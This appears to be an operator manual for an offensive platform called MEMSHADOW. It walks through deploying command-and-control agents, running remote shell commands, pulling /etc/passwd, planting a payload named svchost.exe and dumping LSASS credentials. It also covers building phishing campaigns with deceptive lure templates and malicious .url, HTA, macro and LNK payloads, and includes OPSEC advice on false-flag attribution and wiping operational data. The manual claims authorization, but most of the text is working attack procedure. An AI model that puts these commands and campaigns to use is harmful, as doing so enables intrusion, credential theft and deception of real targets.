# MEMSHADOW Operator Manual
## Complete Operational Guide

**Classification:** UNCLASSIFIED
**Version:** 2.1
**Date:** 2025-11-16
**Status:** OFFICIAL

---

## Table of Contents

1. [Introduction](#introduction)
2. [System Architecture](#system-architecture)
3. [Getting Started](#getting-started)
4. [TEMPEST TUI Operations](#tempest-tui-operations)
5. [C2 Framework Operations](#c2-framework-operations)
6. [LureCraft Phishing Campaigns](#lurecraft-phishing-campaigns)
7. [SWARM Agent Operations](#swarm-agent-operations)
8. [Mission Execution](#mission-execution)
9. [Intelligence Analysis](#intelligence-analysis)
10. [Security & OPSEC](#security--opsec)
11. [Troubleshooting](#troubleshooting)

---

## 1. Introduction

### Purpose
MEMSHADOW is a comprehensive offensive security platform designed for authorized government contractors and security professionals. It integrates multiple offensive capabilities under a unified command structure.

### Authorization Requirements
- **Explicit Written Authorization** required for all operations
- **Legal Review** mandatory for classified missions
- **Operational Approval** from appropriate authority
- **Target Authorization** documented and verified

### Capabilities Overview
- **8 Autonomous Agents** (recon, crawler, apimapper, authtest, bgp, blockchain, wifi, webscan)
- **C2 Framework** for post-exploitation
- **LureCraft** phishing campaigns
- **Hardware Acceleration** (AVX-512, NPU, GPU)
- **TEMPEST TUI** military-grade interface
- **Multi-Classification** support (UNCLASS → TOP SECRET)

---

## 2. System Architecture

### Core Components

```
┌─────────────────────────────────────────────────────────┐
│                   MEMSHADOW Platform                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌────────────┐  ┌────────────┐  ┌────────────────┐   │
│  │  TEMPEST   │  │    C2      │  │   LureCraft    │   │
│  │    TUI     │  │ Framework  │  │   Phishing     │   │
│  └────────────┘  └────────────┘  └────────────────┘   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │         SWARM Orchestrator (8 Agents)            │  │
│  │  recon│crawler│apimapper│authtest│bgp│blockchain │ │
│  │        wifi│webscan                               │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │  Hardware Acceleration (AVX-512, NPU, GPU)       │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Network Architecture
- **Control Plane:** TEMPEST TUI + API endpoints
- **Data Plane:** SWARM agents + Blackboard (Redis)
- **C2 Plane:** C2 controller + deployed agents
- **Persistence:** PostgreSQL + ChromaDB + Redis

---

## 3. Getting Started

### Installation

```bash
# Clone repository
git clone https://github.com/SWORDIntel/MEMSHADOW.git
cd MEMSHADOW

# Install dependencies
pip install -r requirements/base.txt

# Initialize databases
createdb memshadow
alembic upgrade head

# Start services
docker-compose up -d redis postgres
```

### Quick Start

```bash
# Launch TEMPEST TUI
./tempest

# Or start API server
uvicorn app.main:app --host 0.0.0.0 --port 8000
```

### First-Time Setup

1. **Initialize Database:**
   ```bash
   alembic upgrade head
   ```

2. **Create Admin User:**
   ```bash
   python scripts/create_admin.py
   ```

3. **Start SWARM Agents:**
   ```bash
   # Start all agents
   ./scripts/start_agents.sh

   # Or start individually
   python swarm_agents/agent_recon.py recon_001 &
   python swarm_agents/agent_wifi.py wifi_001 &
   python swarm_agents/agent_webscan.py webscan_001 &
   ```

---

## 4. TEMPEST TUI Operations

### Launching TUI

```bash
./tempest
```

### Main Menu Options

**[1] Mission Operations**
- Browse available missions
- Execute classified missions
- Monitor mission progress

**[2] Agent Status & Monitoring**
- View SWARM agent status
- Check task queues
- Monitor completed operations

**[3] Intelligence Dashboard**
- View IoCs (Indicators of Compromise)
- Review discovered vulnerabilities
- Analyze threat intelligence

**[4] Workflow Engine**
- ENUMERATE > PLAN > EXECUTE workflow
- Automated target analysis
- Attack chain generation

**[5] System Configuration**
- Configure SWARM parameters
- Adjust mission settings
- System diagnostics

**[Q] Exit**
- Graceful shutdown

### Mission Execution Example

```
1. Launch TUI: ./tempest
2. Select [1] Mission Operations
3. Choose mission (e.g., "5" for CONFIDENTIAL_targeted_exploitation)
4. Review mission briefing
5. Authorize execution (Y/N)
6. Monitor real-time progress
7. Review results
```

---

## 5. C2 Framework Operations

### Deploying C2 Agents

**Generate Agent:**
```python
from app.services.c2.agent import C2Agent

# Create agent
agent = C2Agent(
    c2_server="c2.example.com",
    c2_port=443,
    use_tls=True,
    beacon_interval=60
)

# Start agent loop
agent.run()
```

**Via Command Line:**
```bash
python -m app.services.c2.agent \
    --server c2.example.com \
    --port 443 \
    --interval 60
```

### Managing C2 Sessions

**List Sessions:**
```bash
curl http://localhost:8000/api/v1/c2/sessions
```

**Execute Shell Command:**
```bash
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/shell \
    -H "Content-Type: application/json" \
    -d '{"command": "whoami"}'
```

**Download File:**
```bash
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/download \
    -H "Content-Type: application/json" \
    -d '{"remote_path": "/etc/passwd", "local_path": "./passwd"}'
```

**Upload File:**
```bash
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/upload \
    -H "Content-Type: application/json" \
    -d '{"local_path": "./payload.exe", "remote_path": "C:\\\\Windows\\\\Temp\\\\svchost.exe"}'
```

**Dump Credentials:**
```bash
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/dump-creds?method=lsass
```

### C2 Dashboard

```bash
curl http://localhost:8000/api/v1/c2/dashboard
```

**Returns:**
- Total sessions (active/dead)
- Tasks sent/completed
- Data exfiltrated
- Session details

---

## 6. LureCraft Phishing Campaigns

### Creating a Campaign

**Step 1: Prepare Targets**

Create `targets.csv`:
```csv
name,email,company,title
John Doe,john.doe@acme.com,ACME Corp,Senior Engineer
Jane Smith,jane.smith@acme.com,ACME Corp,Manager
```

**Step 2: Create Campaign**

```python
from app.services.lurecraft.campaign_manager import CampaignManager

manager = CampaignManager()

# Load targets
targets = manager.load_targets_from_csv("targets.csv")

# Create campaign
campaign = manager.create_campaign(
    campaign_name="Q4_Performance_Review",
    template="performance_review",
    payload_url="https://payload.example.com/agent.exe",
    targets=targets
)

print(f"Campaign ID: {campaign.campaign_id}")
```

**Step 3: Generate Payloads**

```python
# Generate .url files
manifest = manager.generate_payloads(
    campaign_id=campaign.campaign_id,
    output_dir="./campaign_payloads"
)

print(f"Generated {len(manifest['files'])} payloads")
```

**Step 4: Track Campaign**

```python
# Record activities
manager.record_email_sent(campaign.campaign_id)
manager.record_click(campaign.campaign_id)
manager.record_compromise(campaign.campaign_id)

# Get stats
stats = campaign.to_dict()
print(f"Success Rate: {stats['success_rate']}%")
```

### Available Templates

- `performance_review` - Performance review documents
- `bonus_notification` - Bonus/compensation notifications
- `security_alert` - Security alerts (urgent)
- `invoice` - Invoice payment requests
- `document_share` - Shared document notifications

### Payload Types

1. **.url Files** - Internet shortcuts (most common)
2. **HTA Files** - HTML Applications
3. **Macro Documents** - Office macros
4. **LNK Files** - Windows shortcuts
5. **ISO Payloads** - Mountable disk images

---

## 7. SWARM Agent Operations

### Agent Types

| Agent | Purpose | Key Capabilities |
|-------|---------|------------------|
| **recon** | Network reconnaissance | Port scanning, service detection |
| **crawler** | Web crawling | Selenium-based dynamic crawling |
| **apimapper** | API discovery | Endpoint mapping, OpenAPI detection |
| **authtest** | Authentication testing | Auth bypass, credential testing |
| **bgp** | BGP monitoring | Hijack detection, RPKI validation |
| **blockchain** | Blockchain analysis | Fraud detection, cross-chain analysis |
| **wifi** | WiFi penetration testing | Handshake capture, cracking |
| **webscan** | Web vulnerability scanning | XSS, SQLi, SSRF, RCE detection |

### Starting Agents

**All Agents:**
```bash
./scripts/start_agents.sh
```

**Individual Agents:**
```bash
python swarm_agents/agent_recon.py recon_001 &
python swarm_agents/agent_wifi.py wifi_001 &
python swarm_agents/agent_webscan.py webscan_001 &
```

### Agent Communication

Agents communicate via **Blackboard Pattern** (Redis):

```python
from app.services.swarm.blackboard import Blackboard

blackboard = Blackboard()

# Publish task
blackboard.publish_task("wifi", {
    "task_id": "task_001",
    "task_type": "scan",
    "params": {"interface": "wlan0"}
})

# Get task (agent side)
task = blackboard.get_task("wifi", timeout=5)

# Publish report (agent side)
blackboard.publish_report({
    "agent_id": "wifi_001",
    "task_id": "task_001",
    "status": "completed",
    "data": {"networks_found": 5}
})

# Get report (controller side)
report = blackboard.get_report(timeout=5)
```

---

## 8. Mission Execution

### Mission Structure

```yaml
mission_id: "mission_001"
mission_name: "Network Reconnaissance"
description: "Basic network discovery and enumeration"
classification: "UNCLASSIFIED"

objective_stages:
  - stage_id: "recon"
    description: "Network scanning"
    tasks:
      - agent_type: "recon"
        params:
          target_cidr: "192.168.1.0/24"
    success_criteria:
      - "hosts_discovered"
```

### Executing Missions

**Via TUI:**
1. Launch `./tempest`
2. Select Mission Operations
3. Choose mission
4. Authorize execution

**Via API:**
```bash
curl -X POST http://localhost:8000/api/v1/tempest/dashboard/mission/start \
    -H "Content-Type: application/json" \
    -d '{"mission_file": "missions/classified/SECRET_advanced_persistent_threat.yaml"}'
```

### Mission Monitoring

```bash
# Get mission status
curl http://localhost:8000/api/v1/tempest/dashboard/mission/{mission_id}

# Stop mission
curl -X POST http://localhost:8000/api/v1/tempest/dashboard/mission/{mission_id}/stop
```

---

## 9. Intelligence Analysis

### IoC Collection

**View IoCs:**
```bash
curl http://localhost:8000/api/v1/tempest/dashboard/intel/iocs?severity=critical
```

**IoC Types:**
- IPv4/IPv6 addresses
- Domain names
- File hashes (MD5, SHA1, SHA256)
- CVE identifiers
- URLs
- Email addresses
- Cryptocurrency addresses

### Vulnerability Analysis

**View Vulnerabilities:**
```bash
curl http://localhost:8000/api/v1/tempest/dashboard/intel/vulnerabilities?min_cvss=7.0
```

**Vulnerability Data:**
- Type (XSS, SQLi, RCE, etc.)
- CVSS score
- Target URL/host
- Risk level
- Remediation recommendations

---

## 10. Security & OPSEC

### Operational Security Protocols

1. **Authorization**
   - Always obtain written authorization
   - Verify target scope
   - Document approval chain

2. **Classification Handling**
   - Follow classification markings
   - Store classified data appropriately
   - Use proper handling instructions

3. **Attribution Management**
   - Use operational aliases
   - Maintain attribution false flags
   - Avoid traceable patterns

4. **Communication Security**
   - TLS for all C2 communications
   - Encrypted payload delivery
   - Secure delete after operations

5. **Audit Logging**
   - TEMPEST-grade logging enabled
   - Chain-hashed integrity
   - Credential redaction automatic

### Emergency Procedures

**Compromise Detection:**
```bash
# Immediately terminate all C2 sessions
curl -X POST http://localhost:8000/api/v1/c2/emergency-shutdown

# Stop all SWARM agents
./scripts/stop_agents.sh

# Clear operational data
./scripts/sanitize.sh
```

**Abort Codes:**
- **GHOST PHOENIX** - Immediate C2 abort
- **SILENT STORM** - Compromise protocol
- **WINTER FALCON** - Mission abort

---

## 11. Troubleshooting

### Common Issues

**Agent Not Connecting to Blackboard:**
```bash
# Check Redis connectivity
redis-cli ping

# Restart Redis
docker-compose restart redis

# Check agent logs
tail -f logs/agent_recon.log
```

**C2 Session Dead:**
```bash
# Check session status
curl http://localhost:8000/api/v1/c2/sessions/{session_id}

# Cleanup dead sessions
curl -X POST http://localhost:8000/api/v1/c2/cleanup
```

**Mission Stuck:**
```bash
# Check SWARM coordinator status
curl http://localhost:8000/api/v1/tempest/dashboard/status

# Force mission stop
curl -X POST http://localhost:8000/api/v1/tempest/dashboard/mission/{mission_id}/stop
```

**Hardware Acceleration Not Working:**
```bash
# Detect hardware
python -m app.services.hardware.device_detector

# Check AVX-512 availability
grep avx512 /proc/cpuinfo

# Test OpenVINO
python -m app.services.hardware.openvino_wrapper
```

### Support

**Documentation:**
- INTEGRATION_SUMMARY.md
- PHASE3_SUMMARY.md
- API_REFERENCE.md

**Logs:**
- Application: `logs/app.log`
- Agents: `logs/agent_*.log`
- Audit: `audit_logs/`

**Contact:**
- Technical Support: [Redacted]
- Security Incidents: [Redacted]

---

## Appendix A: Command Reference

### TEMPEST TUI
```bash
./tempest                    # Launch TUI
```

### C2 Operations
```bash
python -m app.services.c2.agent --server HOST --port PORT
```

### Agent Management
```bash
./scripts/start_agents.sh    # Start all agents
./scripts/stop_agents.sh     # Stop all agents
```

### Hardware Detection
```bash
python -m app.services.hardware.device_detector
python -m app.services.hardware.avx512_cracker
python -m app.services.hardware.openvino_wrapper
```

---

## Appendix B: API Quick Reference

### C2 Framework
```
POST   /api/v1/c2/register
GET    /api/v1/c2/sessions
GET    /api/v1/c2/sessions/{id}
POST   /api/v1/c2/sessions/{id}/tasks
POST   /api/v1/c2/sessions/{id}/shell
DELETE /api/v1/c2/sessions/{id}
GET    /api/v1/c2/dashboard
```

### TEMPEST Dashboard
```
GET    /api/v1/tempest/dashboard/status
POST   /api/v1/tempest/dashboard/mission/start
GET    /api/v1/tempest/dashboard/mission/{id}
POST   /api/v1/tempest/dashboard/mission/{id}/stop
GET    /api/v1/tempest/dashboard/intel/iocs
GET    /api/v1/tempest/dashboard/intel/vulnerabilities
WS     /api/v1/tempest/dashboard/ws
```

---

**END OF OPERATOR MANUAL**

**CLASSIFICATION: UNCLASSIFIED**
**FOR OFFICIAL USE BY AUTHORIZED PERSONNEL ONLY**
